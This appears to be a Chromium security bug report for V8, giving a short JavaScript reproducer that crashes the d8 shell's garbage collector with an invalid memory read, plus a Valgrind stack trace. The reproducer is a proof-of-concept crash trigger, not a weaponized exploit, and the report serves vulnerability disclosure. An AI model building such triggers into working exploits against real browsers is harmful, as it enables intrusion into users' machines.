<b>VULNERABILITY DETAILS</b>
The JavaScript code below crashes d8 shell (trunk version as in Chrome 23.0.1262.0) in function v8::internal::MarkCompactCollector::EvacuateNewSpace with an invalid read from a random address. As the test requires gc() to reproduce, I only tested this on the v8-trunk shell (version as included in current Chrome dev).

<b>VERSION</b>
Chrome Version: 23.0.1262.0 dev
Operating System: Ubuntu 12.04 64 bit

<b>REPRODUCTION CASE</b>
Object.prototype.__defineSetter__('x', function(value) { result_x = value; });
function setx() {
  x = 100000;
}
setx();
__defineSetter__('x', function() {});
var keys = Object.keys( 3 && this || this ? this : this >>= "x");
gc();


<b>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION</b>
Type of crash: tab
Crash state:

==8041== Invalid read of size 8
==8041==    at 0x5550B0: v8::internal::MarkCompactCollector::EvacuateNewSpace() (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x555EBD: v8::internal::MarkCompactCollector::EvacuateNewSpaceAndCandidates() (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x557250: v8::internal::MarkCompactCollector::SweepSpaces() (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x55FEF1: v8::internal::MarkCompactCollector::CollectGarbage() (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x4B9639: v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GCTracer*) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x4B9E83: v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollector, char const*, char const*) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x4BA6CA: v8::internal::Heap::CollectAllGarbage(int, char const*) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x4743BE: v8::internal::GCExtension::GC(v8::Arguments const&) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x43EF97: v8::internal::Builtin_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate*) (in /scratch/holler/LangFuzz/v8-trunk/d8)
==8041==    by 0x125452006361: ???
==8041==    by 0x12545203FB4F: ???
==8041==    by 0x12545200CFA6: ???
==8041==  Address 0xc0fd7794360 is not stack'd, malloc'd or (recently) free'd
